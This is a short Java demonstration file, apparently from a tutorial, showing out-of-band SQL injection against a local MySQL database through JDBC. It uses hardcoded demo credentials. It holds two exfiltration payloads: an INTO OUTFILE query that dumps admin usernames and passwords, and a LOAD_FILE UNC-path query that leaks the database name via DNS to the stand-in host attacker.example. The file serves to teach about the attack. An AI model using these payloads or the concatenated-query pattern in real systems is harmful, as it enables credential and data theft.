// Out-of-Band SQL Injection via JDBC
// Attacker exfiltrates data through a different channel (DNS/HTTP) than the query.

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.Statement;

public class out_of_band_injection {
    public static void main(String[] args) throws Exception {
        String url = "jdbc:mysql://localhost:3306/database_name";
        String username = "rootgfg";
        String password = "gfg123";

        Class.forName("com.mysql.cj.jdbc.Driver");
        Connection con = DriverManager.getConnection(url, username, password);
        Statement st = con.createStatement();

        // VULNERABLE: INTO OUTFILE writes query output to a file the attacker controls
        String payload = "SELECT username, password FROM admins INTO OUTFILE '/tmp/leak.txt'";
        try {
            st.executeQuery(payload);
            System.out.println("Data written to out-of-band file (if FILE privilege granted)");
        } catch (Exception e) {
            System.out.println("Blocked by MySQL permissions: " + e.getMessage());
        }

        // DNS-based exfiltration attempt via LOAD_FILE on UNC path
        String dnsPayload = "1 AND LOAD_FILE(CONCAT('\\\\\\\\attacker.example\\\\', (SELECT database())))";
        try {
            st.executeQuery("SELECT id FROM users WHERE id = " + dnsPayload);
        } catch (Exception e) {
            System.out.println("DNS exfil attempt sent (no direct result returned)");
        }

        st.close();
        con.close();
    }
}
